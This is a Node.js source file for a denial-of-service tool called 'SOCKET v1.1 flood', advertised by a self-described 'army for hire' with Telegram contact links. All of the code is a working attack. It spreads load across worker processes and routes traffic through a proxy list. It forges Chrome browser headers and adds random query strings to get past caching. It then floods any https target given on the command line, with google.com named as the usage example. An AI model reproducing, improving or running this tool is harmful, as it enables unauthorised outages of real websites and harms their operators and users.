/*
    SOCKET v1.1 flood

    (10 May, 2024)

    Released by ATLAS API corporation (atlasapi.co)

    t.me/atlasapi for more scripts

    Made by Benshii Varga

    npm install colors
*/

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const url = require('url');
const fs = require('fs');
const net = require("net");
const cluster = require('cluster');
const colors = require('colors');
const os = require('os')

if (process.argv.length < 4) {
    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/benshii"));
    console.log(`
    ${`${'SOCKET v1.1'.underline} | Optional debugging, randrate support, queries support, connection types.`.italic}

    ${'Usage:'.bold.underline}

        ${`node SOCKET.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}duration${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}rate${']'.red.bold} ${'['.red.bold}proxy${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'node SOCKET.js https://google.com 300 5 90 proxy.txt --debug true --query 1'.italic}

    ${'Options:'.bold.underline}

        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Debug response codes.`.italic}
        --randrate      ${'true'.green}        ${'-'.red.bold}   ${'Random rate of requests.'.italic}
        --query         ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Generate query [1: ?q=wsqd], [2: ?wsqd].'.italic}
        --connection    ${'1'.yellow}/${'2'.yellow}         ${'-'.red.bold}   ${'Connection header [1: Keep-Alive], [2: Close].'.italic}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
const rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

if (!proxyfile) { error("Invalid proxy file!")}
if (!target || !target.startsWith('https://')) { error("Invalid target address (https only)!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (proxies.length <= 0) { error("Proxy file is empty!") }
var parsed = url.parse(target);

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--query', value: get_option('--query') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--connection', value: get_option('--connection') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    } else if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    } else {
        return false;
    }
}

function log(string) {
    if (enabled('debug')) {
        console.log(`${colors.red('[')}${colors.bold('SOCKET')}${colors.red(']')} | ${string}`);
    }
}

function headers() {

    let connection = 'Keep-Alive';

    switch (enabled('connection')) {
        case 2:
            connection = 'Close';
            break;
        case 1:
            connection = 'Keep-Alive';
            break;
        default:
            break;
    }



    const chromeHeaderOrder = [
        "Host",
        "Sec-Ch-Ua",
        "sec-ch-ua-mobile",
        "sec-ch-ua-platform",
        "upgrade-insecure-requests",
        "user-agent",
        "accept",
        "sec-fetch-site",
        "sec-fetch-mode",
        "sec-fetch-user",
        "sec-fetch-dest",
        "referer",
        "accept-encoding",
        "accept-language",
        "cookie",
    ];
    
    const chromeHeaders = {
        "host": `${parsed.host}`,
        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"macOS\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": `${parsed.href}`,
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,it;q=0.6",
        "connection": connection,
    };

    let query = parsed.path;
    const querySystem = enabled('query');
    if (querySystem) {
        switch (querySystem) {
            case 1:
                query = `${parsed.path}?q=${random_string(6, 7)}`;
                break;
            case 2:
                query = `${parsed.path}?${random_string(6, 7)}`;
                break;
            default:
                query = parsed.path;
                break;
        }
    }
    
    let requestString = `GET ${query} HTTP/1.1\r\n`;
    
    chromeHeaderOrder.forEach(header => {
        if (header === 'Host') {
            requestString += `Host: ${parsed.host}\r\n`;
        } else if (chromeHeaders[header]) {
            requestString += `${header.charAt(0) + header.slice(1).replace(/-/g, '-').replace(/\b\w/g, letter => letter)}: ${chromeHeaders[header]}\r\n`;
        }
    });
    
    requestString += `\r\n`;

    return requestString;
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function attack() {
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        let _rate = rate;

        if (enabled('randrate')) {
            _rate = random_int(1, 90);
        }

        var client = new net.Socket();
        client.connect(proxy[1], proxy[0]);
        client.setKeepAlive(true, 5000);
        client.setTimeout(60000);
        client.once("error", err => {});
        client.once("disconnect", () => {})
        const header = headers();

        function go() {
            for (var i = 0; i < _rate; i++) {
                client.write(header);
            }
            setTimeout(() => {
                go();
            }, 1000 * _rate)
        }

        go();

        client.on("data", (data) => {
            if (enabled('debug')) {
                const buf = data.toString('utf8');
                const bufheader = buf.split('\r\n\r\n')[0];
                const bufstatus = bufheader.split('\r\n')[0];
                if (bufstatus.includes('HTTP/1.1')) {
                    const status = bufstatus.split(' ')[1];
                    if (!isNaN(status)) {
                        let coloredStatus;
                            switch (true) {
                                    case status < 500 && status >= 400 && status !== 404:
                                        coloredStatus = status.toString().red;
                                        break;
                                    case status >= 300 && status < 400:
                                        coloredStatus = status.toString().yellow;
                                        break;
                                    case status === 503:
                                        coloredStatus = status.toString().cyan;
                                        break;
                                    default:
                                        coloredStatus = status.toString().green;
                                        break;
                            }
                        log(`${colors.magenta(proxy[0])}, Status [${coloredStatus}]`);
                    }
                }
            }
            setTimeout(() => {
                client.destroy();
                return delete client;
            }, 5000);
        });
}

if (cluster.isMaster){
    let _options = ""
    for (var x = 0; x < options.length; x++) {
        if (options[x].value !== undefined) {
            _options += `${(options[x].flag).replace('--', '')}, `;
        }
    }

    console.clear();
    console.log(`\n         ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log('')
    console.log(colors.cyan("                        t.me/atlasapi"));
    console.log(`
            ${'Method'.bold}      ${'-'.red}   ${'['.red} ${`SOCKET`.italic} ${']'.red} 
            ${'Target'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
            ${'Time'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
            ${'Threads'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
            ${'Rate'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
            ${'Options'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });
} else {
    setInterval(attack);
    setTimeout(() => process.exit(1), duration * 1000);
}